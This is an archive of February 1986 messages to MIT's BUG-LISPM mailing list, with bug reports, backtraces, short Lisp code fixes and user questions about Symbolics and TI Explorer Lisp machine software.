 7-Feb-86 21:41:21-EST,1925;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 Feb 86 14:57-EST
Date: Fri, 7 Feb 86 14:20 EST
From: CWH@MIT-REAGAN.ARPA
Sender: File-Server@MIT-REAGAN.ARPA
Subject: CWH brain-damage in NETI:NETWORK-TERMINAL-SERVER
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860207142001.1.FILE-SERVER@MIT-ZERMATT.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, Macsyma 318.12,
6-1-Patches 1.9, MLSite 11.0, Mailer 43.6, Imagen Spooler 5.4,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), Network-Security patch, Server-Finger patch,
File system updater, on Zermatt:

The following code in the function NETI:NETWORK-TERMINAL-SERVER is a
total kludge which never should have made it into the release.

       ;; Wait until the notification is delivered, so that it doesn't appear on the newly
       ;; arrived terminal.  We really only have to wait until the value of *REMOTE-TERMINALS*
       ;; has been read by the notification delivery process.
       (IF (EQ REMOTE-LOGIN-ON :NOTIFY)
	   (PROCESS-WAIT "Deliver Notification"
			 #'(LAMBDA ()
			     (STRING-EQUAL
			       (PROCESS-WHOSTATE TV:*NOTIFICATION-PROCESS*)
			       "Notification Wait"))))

When the user option TV:*ALLOW-POP-UP-NOTIFICATIONS* was introduced, a
new whostate "Pop Up Wait" was created and this screwed up the kludge
communication mechanism.  The buggy result is that if the notification
process is in the state "Pop Up Wait", network logins will not work.

This kludge should be replaced with a formal communication variable.
Furthermore, the notification delivery process should deliver the
notification to all remote terminals first, then set the variable, and
then deliver to the main console.

[MIT: File server maintainers can fix this by changing the PROCESS-WAIT
to be PROCESS-WAIT-WITH-TIMEOUT.]
 7-Feb-86 21:42:05-EST,2378;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 Feb 86 15:09-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  7 Feb 86 14:49:22 EST
Received: from NEPONSET.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 412527; Fri 7-Feb-86 14:21:37-EST
Date: Fri, 7 Feb 86 14:27 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Signed fixnum array type needed
To: Harry L. Voorhees <HLV@PYGMALION.AI.MIT.EDU>,
    BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <"860207115024.3.hlv@PYGMALION"@JANIS.AI.MIT.EDU>
Message-ID: <860207142759.9.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Fri, 7 Feb 86 11:50 EST
    From: Harry L. Voorhees <HLV@PYGMALION.AI.MIT.EDU>

    One of you guys should really implement a signed fixnum array type.
    One obvious reason is storage efficiency, e.g. if only 8 or 16 bits are
    needed instead of the 32 provided by array type art-q.

    A second, though, is for speed:  Only art-q arrays can hold signed
    fixnums, but they're not, in general, bitbltable.  There's no way to
    do type checking to see if its safe to bitblt an art-q array without
    checking every element.  A signed art-fixnum array type would take care
    of this.

Symbolics has had an art-fixnum array since 6.0 (with bugs), documented
in 6.1 (and bugs fixed).  It is a full Q and does error checking on
store (and I think on retrieve).  Therefore, they are always BITBLTable.

    Or will common lisp provide an efficient representation for signed
    fixnums?

Common Lisp lets the implementation do anything it wants.
	(make-array 4 :element-type '(unsigned-byte 8))
	=> #<ART-8B-4 160540372>
but
	(make-array 4 :element-type '(signed-byte 8))
	=> #<ART-FIXNUM-4 160540610>
I believe this is allowed by Common Lisp.

There are two ways to get dense packing of specific sizes if you are
really worried about space.  Both require you to abstract your AREF code
into MY-AREF.  [These examples will be for 8 bit bytes.]  One way is to
do offsets by yourself:
	(defsubst my-aref (array index)
	  (- (aref array index) 128.))
	(defsetf my-aref ... something that adds 128 before storing ...)
The other is to not offset but sign extend on readout:
	(defsubst my-aref (array index)
	  (let ((value (aref array index)))
	    (dpb value (byte 7 0)
		 (- (ldb (byte 1 7) value)))))

 7-Feb-86 21:46:37-EST,450;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 Feb 86 20:50-EST
Received: from BORAX.LCS.MIT.EDU by MC.LCS.MIT.EDU  7 Feb 86 19:10:29 EST
Received: by BORAX.LCS.MIT.EDU (4.12/4.7); Fri, 7 Feb 86 19:07:04 est
Date: Fri, 7 Feb 86 19:07:04 est
Message-Id: <8602080007.AA02024@BORAX.LCS.MIT.EDU>
From: Nick Papadakis <nick@BORAX.LCS.MIT.EDU>
Sender: nick@BORAX.LCS.MIT.EDU
To: bug-lispm@mc
Subject: please add

nick@mc

thx.
10-Feb-86 09:44:16-EST,1998;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 10 Feb 86 09:44-EST
Received: from SCRC-STONY-BROOK.ARPA by MIT-ZERMATT.ARPA via INTERNET with SMTP id 23945; 10 Feb 86 09:44:22-EST
Received: from REDWING.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 413581; Mon 10-Feb-86 09:34:28-EST
Date: Mon, 10 Feb 86 09:33 EST
From: Benson I. Margulies <Margulies@SCRC-YUKON.ARPA>
Subject: Wedge in Fep file system
To: Robert A. Cassels <Cassels@SCRC-STONY-BROOK.ARPA>,
    qobi@MIT-NEWTOWNE-VARIETY.ARPA, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860206151405.9.CASSELS@CUYAHOGA.SCRC.Symbolics.COM>
Message-ID: <860210093312.8.MARGULIES@REDWING.SCRC.Symbolics.COM>

    Date: Thu, 6 Feb 86 15:14 EST
    From: Robert A. Cassels <Cassels@TENEX.SCRC.Symbolics.COM>

	Date: Thu, 6 Feb 86 12:56 EST
	From: Jeffrey Mark Siskind <qobi@MIT-NEWTOWNE-VARIETY.ARPA>

	In Symbolics 3670 Release 6.1, IP-TCP 29.13, Macsyma 318.12,
	6-1-Patches 1.9, MLSite 12.0, MetaSyn 36.11, microcode TMC5-IO4-MIC 336,
	FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
	FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Telluride:

	I noticed the following bug.
	When one attempts to do a si:receive-band and there is not enough room on the local
	fep file system, one gets an error. If one then aborts then the file which was
	intended to receive the fep file is created with a zero length and is evidently
	still locked. One can delete it but if one then expunges the fep directory
	the file remains. If one tries to do a second si:receive-band to the same file-name
	(presumably after deleting enough other files) it asks whether you want to overwrite
	the file. If you answer Yes it tells you that it can't since the file is locked.
	The only remedy I have found is to reboot the machine.
	-: Jeff

    Another short-term remedy is to rename the locked file -- then you don't
    have to boot.


fixed in release 7.

10-Feb-86 15:08:22-EST,753;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 10 Feb 86 14:52-EST
Date: Mon 10 Feb 86 14:08:46-EST
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: Questions about host availability in Symbolics software
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12182302951.51.KT@XX.LCS.MIT.EDU>

Hi,
	Can anyone out there give me a brief explanation of the AVAILABILITY
instance variable of hosts?  I'd like to know what its contents mean, what
causes it to change, and what subsystems use it.  If you're wondering how
I came across it, I discovered that by playing around with it I could
fix problems like "no namespace servers known ..." etc.

	Thank you to whoever responds for your taking the time to enlighten me.

				--- Ken
-------
10-Feb-86 22:41:20-EST,1582;000000000000
Mail-From: CJL created at 10-Feb-86 22:41:15
Date: Mon, 10 Feb 1986  22:41 EST
Message-ID: <CJL.12182396244.BABYL@MIT-OZ>
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
To:   Ken Traub <KT@XX.LCS.MIT.EDU>
Cc:   bug-lispm@OZ.AI.MIT.EDU
Subject: Questions about host availability in Symbolics software
In-reply-to: Msg of 10 Feb 1986  14:08-EST from Ken Traub <KT at XX.LCS.MIT.EDU>

    Date: Monday, 10 February 1986  14:08-EST
    From: Ken Traub <KT at XX.LCS.MIT.EDU>

    Hi,
    	Can anyone out there give me a brief explanation of the AVAILABILITY
    instance variable of hosts?  I'd like to know what its contents mean, what
    causes it to change, and what subsystems use it.  If you're wondering how
    I came across it, I discovered that by playing around with it I could
    fix problems like "no namespace servers known ..." etc.

    	Thank you to whoever responds for your taking the time to enlighten me.

My impression is that only the namespace system uses it. There's a patch
in the system 6-1-patches here at MIT that makes the namespace system
try harder to connect to namespace servers by essentially ignoring this
variable if there's no namespace servers availiable at all. It seems to
make the namespace system work a lot better.

The system 6-1-patches is a system that we have loaded into AI lab and
ML site lispms that have patches that fix bugs in the symbolics system
that are particularly important to machines here at MIT. I recommend
that you guys on the second floor also load it into your tanglewood
world load as well.
11-Feb-86 10:05:45-EST,2577;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Feb 86 10:05-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 11 FEB 86  10:05:04 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 22679; Tue 11-Feb-86 10:02:27-EST
Date: Tue, 11 Feb 86 10:01 EST
From: jcma@MIT-MC.ARPA
Subject: Typep should hack :KEYWORD
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860211100152.6.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 11.12, Experimental RELATUS 145.59, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:



>>Error: :KEYWORD is not a type known to TYPEP
While in the function TYPEP  SI:*EVAL  (:INTERNAL SI:BREAK-INTERNAL 1)

TYPEP:  (P.C. = 165)
   Arg 0 (SI:X): :FOO
   Arg 1 (SI:TYPE): :KEYWORD
   Local 2 (SI:DTP): 2
   Local 3 (SI:PRED): NIL
   Local 4 (SYMBOL): "~S is not a type known to TYPEP"

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (TYPEP :FOO :KEYWORD)
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:BREAK-INTERNAL 1):  (P.C. = 4)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): (NIL)
   Arg 1 (SI:FORM): (TYPEP :FOO :KEYWORD)

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 74640265>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 74640272>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Breakpoint ZMACS"
   Arg 1 (SI:ABORT-FUNCTION): SI:BREAK-HERALD
   Arg 2 (SI:READ-FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL SI:BREAK-INTERNAL 0) 54713201>
   Arg 3 (SI:EVAL-FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL SI:BREAK-INTERNAL 1) 54713203>
   --Defaulted args:--
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:BREAK-INTERNAL:  (P.C. = 212)
   Arg 0 (SI:TAG): "ZMACS"
   Local 0 (SI:TAG): "Breakpoint ZMACS"
   Arg 1 (SI:CONDITIONAL): T
   --Defaulted args:--
   Arg 2: NIL

COM-BREAK:  (P.C. = 65)

Rest of stack:
COMMAND-EXECUTE:  (P.C. = 57)
PROCESS-COMMAND-CHAR:  (P.C. = 14)
(:METHOD EDITOR :EDIT):  (P.C. = 233)
(:METHOD TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
11-Feb-86 10:11:06-EST,683;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Feb 86 10:11-EST
Date: Tue, 11 Feb 86 10:10:46 EST
From: Bill Long <WJL@MC.LCS.MIT.EDU>
To: BUG-LISPM@MC.LCS.MIT.EDU
Message-ID: <[MC.LCS.MIT.EDU].814796.860211.WJL>

Dear Sirs:
	Hello again.  This time I have a question.  Is there any way
to bound a search in zmacs?  The context is that I'd like to be able
to write keyboard macros that stay within certain limits (typically
a Lisp expression).  In Teco it was possible to write iterations with
termination conditions.  In Emacs it was possible to shrink the buffer
to the region of concern.  Both features would be useful -- do they
exist?
-Bill Long
11-Feb-86 11:25:03-EST,1115;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Feb 86 11:24-EST
Received: from MEDIA-LAB (2005512) by mit-eddie (4.12/4.7)
	id AA10604; Tue, 11 Feb 86 11:23:18 est
Received: by MEDIA-LAB (5.15/4.8)  id AA07226; Tue, 11 Feb 86 11:23:14 EST
Date: Tue, 11 Feb 86 11:23 EST
From: James R. Davis <jrd@MEDIA-LAB.MIT.EDU>
Subject: TERMINAL-IO as package!
To: BUG-LISPM@MEDIA-LAB.MIT.EDU
Message-Id: <860211112303.1.JRD@XEVIOUS.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, COLOR 135.50, DECTALK 1.1,
Japanese 24.1, COLOR-DEMO 68.7, Experimental TMC 3d Image Toolkit 71.0,
microcode TMC5-COLOR-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(3), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Xevious:


If you should type (by accident) TERMINAL-IO followed
by colon and space to a Lisp listener, you get into an
infinite flickering loop which says something like

TERMINAL-IO is not meaningful as a package name relative to USER.
While reading from #:TERMINAL-IO-SYN-STREAM

Abort get you out, so it appears to be just an annoyance, not a danger.

12-Feb-86 11:38:37-EST,1786;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Feb 86 11:38-EST
Received: from MEDIA-LAB (2005512) by mit-eddie (4.12/4.7)
	id AA00011; Wed, 12 Feb 86 11:37:15 est
Received: by MEDIA-LAB (5.15/4.8)  id AA24186; Wed, 12 Feb 86 11:37:43 EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 12 Feb 86 11:34:24 EST
Received: from CONTOOCOOK.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 415469; Wed 12-Feb-86 11:31:58-EST
Date: Wed, 12 Feb 86 11:33 EST
From: Kyra Lowther <toto@SCRC-YUKON.ARPA>
Subject: TERMINAL-IO as package!
To: jrd@MEDIA-LAB.MIT.EDU
Cc: BUG-LISPM@MEDIA-LAB.MIT.EDU
In-Reply-To: <860211112303.1.JRD@XEVIOUS.ARPA>
Message-Id: <860212113309.3.TOTO@CONTOOCOOK.SCRC.Symbolics.COM>

    Date: Tue, 11 Feb 86 11:23 EST
    From: James R. Davis <jrd@MEDIA-LAB.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, COLOR 135.50, DECTALK 1.1,
    Japanese 24.1, COLOR-DEMO 68.7, Experimental TMC 3d Image Toolkit 71.0,
    microcode TMC5-COLOR-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(3), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Xevious:


    If you should type (by accident) TERMINAL-IO followed
    by colon and space to a Lisp listener, you get into an
    infinite flickering loop which says something like

    TERMINAL-IO is not meaningful as a package name relative to USER.
    While reading from #:TERMINAL-IO-SYN-STREAM

    Abort get you out, so it appears to be just an annoyance, not a danger.

This is a known bug that was fixed before Release 6.1.  I tried 

(send terminal-io:

on my machine here and on Zaxxon and Xevious there and got the same 
message but not the "infinite flickering loop".  What were you doing?


12-Feb-86 12:24:02-EST,955;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Feb 86 12:23-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 12 FEB 86  12:24:02 EST
Received: from OZ.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 22771; Wed 12-Feb-86 12:21:56-EST
Received: from MORRISON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Feb 86 12:22-EST
Date: Wed, 12 Feb 86 12:22 EST
From: jcma@MIT-MC.ARPA
Subject: ZWEI:INTERVAL-STREAM
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860212122242.4.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 11.12, Experimental RELATUS 145.59, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

Should support :STRING-SEARCH and :STRING-REVERSE-SEARCH.  That way people
wouldn't have to implement it themselves all the time.
13-Feb-86 09:04:19-EST,1470;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 13 Feb 86 09:04-EST
Received: from JANIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 22837; Thu 13-Feb-86 09:02:38-EST
Date: Thu, 13 Feb 86 09:04 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Namespace editor bug
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860213090409.1.CJL@JANIS.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.0, Macsyma 310.35, microcode TMC5-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Janis Joplin:

The namespace editor should display the namespace for names in NICKNAME
and SHORT-NAME attributes if it isn't the same namespace as the primary
name. The default namespace for new names typed in for these attributes
should be the one the primary name is in, not the local namespace of
the machine in which the ediditing is done. 

People have gotten screwed, for example, editing on an AI lab machine,
host MIT|EECS. Add the nickname "DT", and the namespace editor displays
DT, but adds the nickname "AI|DT" to the object. When the object gets
saved on the namespace server, the namespace server creates a Host
object in the AI namespace named AI|DT, with a nickname pointing to the
host MIT|EECS. The person thought he just added a nickname MIT|DT to the
host MIT|EECS, and got no information otherwise.
13-Feb-86 17:25:16-EST,507;000000000000
Received: from BUGS-BUNNY.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 13 Feb 86 17:24-EST
Return-Path: <vanni>
Received: by mit-bugs-bunny.ARPA (4.12/MIT.1x)
	 on Thu, 13 Feb 86 17:19:10 est
Date: Thu, 13 Feb 86 17:19:10 est
From: Giovanni Aliberti <vanni@mit-bugs-bunny>
To: bug-lispm@oz
Subject: Request to STOP forwarding BBoards


We have removed BBoards from our system, and are using `news' instead.
Please stop forwarding BBoards to "bboards@mit-bugs-bunny".

thanks in advance !!

-vanni
13-Feb-86 19:11:17-EST,3743;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 13 Feb 86 19:11-EST
Received: from RTS-1.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 24335; Thu 13-Feb-86 19:10:32-EST
TO:             Bug-LISPM@ZERMATT
SUBJECT:        Bug in LISPM
DATE:           13-Feb-86 19:10:34
FROM:           Steve Ward <Ward@ZERMATT>
MESSAGE-ID:     <Ward.2717712633@RTS-1>

While running:
System 3.11, Compiler 3.0, File System 3.0, Universal Command Loop 3.0,
Window System 3.1, Input Editor 3.0, ZMACS 3.3, Error Handler 3.0,
Suggestions 3.0, Debug Utilities 3.2, Explorer-Net 3.5, Telnet 3.0,
Vt100 3.0, File Server 3.0, Net-Config 3.1, Font Editor 3.0, Mailer 3.1,
Mail-Reader 3.2, Streamer-Tape 3.2, Local-File 3.10, System-Log 3.0,
Serial-Parallel 3.0, Printer 3.0, Glossary 3.0, IMAGEN 3.0, NVRAM 3.0,
User Profile Utility 3.1, Experimental MIT Patchable System 1.6,
microcode 253, MIT REL2.0 2/13

Insert your description of the circumstances here:


Got this on an "R" in mail summary mode.


>>ERROR: ("ZERMATT") is an ill-formed function object
Backtrace from the debugger:

SI:APPLY-LAMBDA (P.C. = 305)

 Arg 0 (FCTN): ("ZERMATT")
 Arg 1 (ARGLIST): (:NAME)
 Local 0 (FCTNAME): NIL
 Local 1 (SPECIALS): NIL
 Local 2 (LAMBDA-LIST): NIL
 Local 3 (BODY): NIL
 Local 4 (SIZE): 0
 Local 5 (BFRAME): NIL
 Local 6 (INSTANCE-BINDINGS): NIL
 Local 7 (B): NIL
 Local 8 (SPECIALS): NIL
 Local 9 (FORM): NIL
 Local 10 (X): NIL
 Local 11 (V): NIL
 Local 12 (Y): NIL
 Local 13 (Z): NIL
 Local 14 (NEXTSLOT): NIL
 Local 15 (ARG): NIL
 Local 16 (ARG-COUNT): NIL
 Local 17 (NARGS): NIL
 Local 18 (RESTARGL): NIL
 Local 19 (OPTVAR): NIL
 Local 20 (RESTVARLIST): NIL
 Local 21 (VAR): NIL
 Local 22 (SUPPLIED-P): NIL
 Local 23 (SPECIALVAR): NIL
 Local 24 (FOUND): NIL
 Local 25 (SYMBOL-LOC): NIL
 Local 26 (KEY): NIL
 Local 27 (KEYWORDS-ALREADY-SEEN): NIL
 Local 28 (CHECK-KEYWORDS): NIL
 Local 29 (L): NIL


("ZERMATT"):
   Arg 0: :NAME


MAIL::STRING-FOR-MAIL-DOMAIN (P.C. = 43)

 Arg 0 (DOMAIN): ("ZERMATT")
 Local 0 (STRING): NIL


(:METHOD MAIL::RFC822-ADDRESS :STRING-FOR-MESSAGE) (P.C. = 330)
  (SELF is #MAIL::RFC822-ADDRESS :TYPE :ROUTE-ADDR :PHRASE "Steve Ward" :LOCAL-PART ("ward") :DOMAIN ("ZERMATT") :ROUTE NIL :MAILBOX-LIST NIL :COMMENT "" :PROPERTY-LIST NIL)

 Arg 0 (.OPERATION.): :STRING-FOR-MESSAGE
 Local 0: ("ward")
 Local 1 (STRING): "Steve Ward <ward"
 Local 2 (MAILBOX): NIL
 Local 3 (X): NIL
 Local 4 (ONE-ROUTE): NIL
 Local 5 (LOCAL-ELEMENT): "ward"


ZWEI::DEFAULT-REPLY-TO-ALL-TEMPLATE (P.C. = 275)

 Local 0 (REPLY-LIST): ((:TO #MAIL::RFC822-ADDRESS :TYPE :ROUTE-ADDR :PHRASE NIL :LOCAL-PART ("ward") :DOMAIN ("ZERMATT") :ROUTE NIL :MAILBOX-LIST NIL :COMMENT "" :PROPERTY-LIST NIL) (:RESENT-TO) (:CC) (:RESENT-CC) ...)
 Local 1 (TO): (#MAIL::RFC822-ADDRESS :TYPE :ROUTE-ADDR :PHRASE "Steve Ward" :LOCAL-PART ("ward") :DOMAIN ("ZERMATT") :ROUTE NIL :MAILBOX-LIST NIL :COMMENT "" :PROPERTY-LIST NIL)
 Local 2 (CC): (#MAIL::RFC822-ADDRESS :TYPE :ROUTE-ADDR :PHRASE NIL :LOCAL-PART ("ward") :DOMAIN ("ZERMATT") :ROUTE NIL :MAILBOX-LIST NIL :COMMENT "" :PROPERTY-LIST NIL)
 Local 3 (SUBJECT): ""
 Local 4: NIL
 Local 5 (ADDRESS): NIL


Remainder of stack:

ZWEI::COM-MAIL-REPLY-TO-ALL (P.C. = 23)
ZWEI::COMMAND-EXECUTE (P.C. = 104)
ZWEI::PROCESS-COMMAND-CHAR (P.C. = 65)
(:METHOD ZWEI:WINDOW :EDIT) (P.C. = 540)
(:INTERNAL (:METHOD ZWEI:ZMACS-WINDOW :COMBINED :EDIT) SI::CONTINUATION) (P.C. = 74)
FUNCALL (P.C. = 25)
(:METHOD ZWEI::DISPLAYER :AROUND :EDIT) (P.C. = 31)
(:METHOD ZWEI:ZMACS-WINDOW :COMBINED :EDIT) (P.C. = 47)
ZWEI::ZMACS-WINDOW-TOP-LEVEL (P.C. = 72)
SI::PROCESS-TOP-LEVEL (P.C. = 246)


14-Feb-86 08:06:54-EST,5399;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 Feb 86 08:06-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 14 FEB 86  08:07:12 EST
Received: from OZ.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 22922; Fri 14-Feb-86 08:05:35-EST
Received: from MORRISON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 Feb 86 08:06-EST
Date: Fri, 14 Feb 86 08:06 EST
From: JCMA@MIT-AI.ARPA
Subject: Attribute Lists in ZMACS: Absolutely Disgusting
To: BUG-LISPM@MIT-REAGAN.ARPA, bug-lispm@SCRC-STONY-BROOK.ARPA
cc: bug-relatus@MIT-MC.ARPA
Message-ID: <860214080642.6.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 11.12, Experimental RELATUS 145.61, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

I have been wading through various levels of screws with zmacs attribute lists
while attempting to implement a new Relatus feature.  The major amount of time
invloved is finding how the system code is screwing me.  It is a horrible
kludge and must screw Symbolics implementors constantly.  Here is just one
little example of the lossage.  While trying to frob the plist to remove bogus
properties which the system puts back on the plist after my code removes them
from both the buffer and the generic pathname, I find that some losing
pathname code randomizes my argument to remprop.  Give me a break.  With
kludges like this, it is a wonder your machine works AT ALL.  I don't expect
it will work much longer either.  This crap is really disgusting and must
waste incredible amounts of hacker time.

If somebody wants to provide some customer support, I want to add a bunch of
attributes to buffers. I want to change them and have the changes reflected in
thwe string in the buffer.  I want ones equal to the default value to be
removed from the buffer.  And I want random functions not to come along and
randomize the values of these attributes on the attribute list.  Is this too
much to ask?  (don't tell me it's a system internal.  Make and interface to
it so nobody has to look at it again.)

>>Error: The fourth argument (INDICATOR) to (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP), "MORRISON", was of the wrong type.
         The function expected a symbol.
While in the function (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP)  (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP)  SEND

(:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP):  (P.C. = 13)
   Arg 0 (SELF): #<NON-FILE-BUFFER "bar" 116402610>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:PROPERTY-LIST-MIXIN -- 1. IV's, 0. FL's 120336350>
   Arg 2 (SI:OPERATION): :REMPROP
   Arg 3 (SI:INDICATOR): "MORRISON"

(:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP):  (encapsulated for TRACE)
   Rest arg (ARGLIST): (("MORRISON") #<NON-FILE-BUFFER "bar" 116402610> :REMPROP "MORRISON")

SEND:  (P.C. = 6)
   Arg 0 (SI:OBJECT): #<NON-FILE-BUFFER "bar" 116402610>
   Arg 1 (SI:MESSAGE-NAME): :REMPROP
   Rest arg (SI:ARGUMENTS): ("MORRISON")

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): ( * :REMPROP :SOURCE-CODING-LOCATION)
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:BREAK-INTERNAL 1):  (P.C. = 4)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): (NIL)
   Arg 1 (SI:FORM): ( * :REMPROP :SOURCE-CODING-LOCATION)

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 43440265>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 43440272>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Breakpoint ZMACS"
   Arg 1 (SI:ABORT-FUNCTION): SI:BREAK-HERALD
   Arg 2 (SI:READ-FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL SI:BREAK-INTERNAL 0) 52435551>
   Arg 3 (SI:EVAL-FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL SI:BREAK-INTERNAL 1) 52435553>
   --Defaulted args:--
